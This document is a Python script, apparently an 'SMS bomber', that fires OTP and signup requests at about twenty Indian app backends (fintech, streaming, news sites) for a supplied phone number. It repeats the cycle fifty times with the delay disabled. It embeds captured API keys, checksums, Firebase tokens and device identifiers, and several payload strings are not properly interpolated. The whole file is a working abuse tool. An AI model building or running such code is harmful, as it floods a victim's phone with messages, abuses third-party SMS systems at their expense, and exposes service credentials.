import requests
import time
import json 

def smsgd(number):
    number = str(number)

    # List of APIs to call
    apis = [
        {
            "method": "GET",
            "url": f"https://webapp.smartcoin.co.in/users/null/otpVerification/requestOtp/REGISTRATION/SMS?phoneNumber={number}&name=null&device_id=null&android_id=c7abc1fd7459e84c&rooted=0&locale=en&app_instance_id=null&google_ad_id=d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785&app_store_key=google_play_store&fcm_token=f_u1nGSLRQ2c2Cw_ZhmvpP:APA91bHQCmiwzyRb8-QHmVN16n6-jjFC8lxp_sz1c91l4-1_6osymmD2ZLWcGkXAodp99QUr6DocUFBdZs0kGanjToDUxNCDlRxGKpj7qG9pklXloBNVhHdCo4FsN7YjZFbLVYn5AdtW&fb_ref=null&utm_source=client_unknown&utm_campaign=client_unknown&app_version=562&id_token=null&phone_number={number}",
            "headers": {
                "Host": "webapp.smartcoin.co.in",
                "checksum": "lqgvB2F18Gqk5QYTk+m5uw==",
                "request_id": "null1722769745692",
                "user-agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "accept-encoding": "gzip"
            },
        },
        {
            "method": "POST",
            "url": "https://be-prod-v1.onemuthoot.com/api/v1/om/notifications/otps?androidAppVersionCode=219",
            "headers": {
                "Host": "be-prod-v1.onemuthoot.com",
                "om-request-source": "MFL_ONE_ANDROID_APP",
                "content-type": "application/json; charset=UTF-8",
                "content-length": "38",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": f'{{"recipientMobileNumber":"{number}"}}'
        },
        {
            "method": "POST",
            "url": "https://www.gimbooks.com/v4/account/auth/get-otp/",
            "headers": {
                "Host": "www.gimbooks.com",
                "content-type": "application/x-www-form-urlencoded",
                "content-length": "16",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": f"phone={number}"
        },
        {
            "method": "POST",
            "url": "https://www.ratri.app/api/users/register/",
            "headers": {
                "Host": "www.ratri.app",
                "content-type": "application/json; charset=UTF-8",
                "content-length": "149",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.12"
            },
            "data": f'{{"age_above_18":"true","email":"hsiaii@gamil.com","full_name":"skaoos sisi","phone":"{number}","phone_code":"+91","terms_conditions_agreed":"true"}}'
        },
        {
            "method": "POST",
            "url": "https://www.ratri.app/api/users/send-otp/",
            "headers": {
                "Host": "www.ratri.app",
                "content-type": "application/json; charset=UTF-8",
                "content-length": "41",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.12"
            },
            "data": f'{{"phone":"{number}","phone_code":"+91"}}'
        },
        {
            "method": "POST",
            "url": "https://api.battameez.com/api/v1.0/loginWithOtp",
            "headers": {
                "User-Agent": "Android",
                "Accept-Encoding": "gzip",
                "signature": "kWVK7yyA9i7NWo9tJpl6ZpZYvsk=",
                "Content-Type": "application/json",
                "Host": "api.battameez.com",
                "Connection": "Keep-Alive",
                "Content-Length": "53"
            },
            "data": f'{{"phoneNumber":"+91-{number}","platform":"Android"}}'
        },
        {
            "method": "POST",
            "url": f"https://api2.feelapp.in/i/api/v1/otp/send/new/cdiOpn?mobileNumber={number}",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "api2.feelapp.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Length": "0"
            },
            "data": ""
        },
        {
            "method": "POST",
            "url": f"https://gway.atrangii.in/r/api/v1/otp/send/new/cdiOpn?mobileNumber={number}",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "gway.atrangii.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Length": "0"
            },
            "data": ""
        },
        {
            "method": "POST",
            "url": "https://us-central1-x-avenue-213708.cloudfunctions.net/sendSmsOtp",
            "headers": {
                "Host": "us-central1-x-avenue-213708.cloudfunctions.net",
                "firebase-instance-id-token": "dgIux0MbT-29b-J2vBfiRx:APA91bFDpkyJ4y_TrMfzjIamUm3eXen6uzrbCe2NS6X5VI6SMF_u0V5_AJeFexRbpNMTOA-sD2kUNaZGeV947TNZeHn0iCPPYADyUcrUsNEHAPezZ2wYZqgp4yP9OtsV_G81j0gHz2j-",
                "content-type": "application/json; charset=utf-8",
                "content-length": "40",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": f'{{"data":{{"phoneNumber":"+91{number}"}}}}'
        },
        {
            "method": "POST",
            "url": "https://us-central1-x-avenue-213708.cloudfunctions.net/sendOtp",
            "headers": {
                "Host": "us-central1-x-avenue-213708.cloudfunctions.net",
                "firebase-instance-id-token": "dgIux0MbT-29b-J2vBfiRx:APA91bFDpkyJ4y_TrMfzjIamUm3eXen6uzrbCe2NS6X5VI6SMF_u0V5_AJeFexRbpNMTOA-sD2kUNaZGeV947TNZeHn0iCPPYADyUcrUsNEHAPezZ2wYZqgp4yP9OtsV_G81j0gHz2j-",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": f'{{"data":{{"phoneNumber":"+91{number}"}}}}'
        },
        {
            "method": "POST",
            "url": "https://communication.api.hungama.com/v1/communication/otp?country=IN",
            "headers": {
                "Content-Type": "application/json",
                "API-KEY": "eedca4a2d4b0b360628958dd0fd210a6",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "communication.api.hungama.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            },
            "data": '{"appCode":"un","mobileNo":{number},"countryCode":"+91","messageId":"1","emailId":" ","subject":"Register","priority":"1","device":"android","variant":"v1"}'
        },
        {
            "method": "POST",
            "url": "https://dishtv-api.revlet.net/service/api/auth/signup/validate",
            "headers": {
                "Host": "dishtv-api.revlet.net",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.6",
                "box-id": "c7abc1fd7459e84c",
                "tenant-code": "dishtv",
                "session-id": "78ce486d-a978-430b-8d75-2c62fe7789b5"
            },
            "data": '{"password":"dishtv@123#","mobile":"91{number}","referral_type":"","referral_id":"","cookie":"","additional_params":{"isOptedForPromotions":"true"},"is_header_enrichment":false,"os_version":"14","app_version":"9.6.5","manufacturer":"SM-F7110"}'
        },
        {
            "method": "POST",
            "url": f"https://lgi-api-prod.aws.playco.com/api/v0.2/mobile/verify/91{number}/signup?lang=en&repeat=false",
            "headers": {
                "Host": "lgi-api-prod.aws.playco.com",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "Lionsgate Play/StarzAPP(com.lionsgateplay.videoapp;build:3090;Android:14)",
                "accept": "application/json",
                "client-type": "Android",
                "x-tracker-id": "1722785333194-9062802462019571687",
                "x-app-ad-id": "d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785"
            },
            "data": '{"type":"signUp"}'
        },
        {
            "method": "POST",
            "url": "https://userapiprod-njsapi.epicon.in/users/sendOTP",
            "headers": {
                "Host": "userapiprod-njsapi.epicon.in",
                "x-access-auth-token": "tkLkjzlYe876feNbkfbTeEVgkG9VgH7Y",
                "user-agent": "samsung SM-F7110|c7abc1fd7459e84c",
                "x_country": "IN",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": '{"otp":"","user_agent":"samsung SM-F7110|c7abc1fd7459e84c","user_id":"91{number}","user_signup_method":"MOBILE"}'
        },
        {
            "method": "POST",
            "url": "https://one.clear.in/api/auth/send-otp",
            "headers": {
                "Host": "one.clear.in",
                "accept": "application/json, text/plain, */*",
                "x-platform": "android",
                "x-app-version": "52",
                "x-request-id": "ecdf9d8a-5e73-46f0-ab00-35a46fe3eaf5",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.10"
            },
            "data": f'{{"phoneNumber":"{number}"}}'
        },
        {
            "method": "POST",
            "url": "https://jsso1.indiatimes.com/sso/crossapp/identity/native/getLoginOtp",
            "headers": {
                "appVersion": "8.46.1",
                "channel": "gaana.com",
                "keyId": "YSJK56KL3JBAPB",
                "appVersionCode": "1136",
                "deviceId": "elxlivxs3bb5mwidepgwqr2ap",
                "platform": "android",
                "sdkVersionCode": "3",
                "CONTENT_TYPE": "application/json",
                "checksum": "kt1RgDWtlElTVddl6EjR2bNJ6F7bb77OcXuZdAKzz1o=",
                "tgid": "elxlivxs3bb5mwidepgwqr2ap",
                "sdkVersion": "3.0.17.14",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "jsso1.indiatimes.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            },
            "data": {"mobile":"+91-{number}","email":""}
        },
        {
            "method": "GET",
            "url": f"https://auth-api.salaryboxapp.com/auth/otp/login?pn={number}&dc=91",
            "headers": {
                "Host": "auth-api.salaryboxapp.com",
                "app-version-code": "477",
                "client-platform": "Android",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.8.0"
            }
        },
        {
            "method": "POST",
            "url": "https://app.mintpro.in/api/v3/login/authenticate",
            "headers": {
                "Host": "app.mintpro.in",
                "x-tenant": "turtlemint",
                "x-broker": "turtlemint",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0",
                "appversion": "180"
            },
            "data": '{"androidVersionNo":"34","appHashCode":"","appVersion":"180","appsflyerUID":"1722786845914-660411448727150011","device_type":"app","mobile":{number}}'
        },
        {
            "method": "GET",
            "url": "https://sso.amarujala.com/v2/auth/nkit/sendotp?country_code=91&mobile={number}&platform=Android&hash=OTE5MzM2NzM0NDQy",
            "headers": {
                "Host": "sso.amarujala.com",
                "clientkey": "5822f190b5164f16380b32a9",
                "propertykey": "5822f190b5164f16380b32aa",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            }
        }
        # Add remaining APIs similarly
    ]

    # Run the requests for 50 iterations
    for _ in range(50):
        for api in apis:
            try:
                if api["method"] == "POST":
                    response = requests.post(api["url"], data=api["data"], headers=api["headers"])
                elif api["method"] == "GET":
                    response = requests.get(api["url"], headers=api["headers"])
                print(f"Request to {api['url']} - Status Code: {response.status_code}")
            except Exception as e:
                print(f"Error during request to {api['url']}: {e}")
        # Add a delay of 10 seconds between requests
       # time.sleep(10)

# Example usage:
 # Replace with the actual phone number you want to use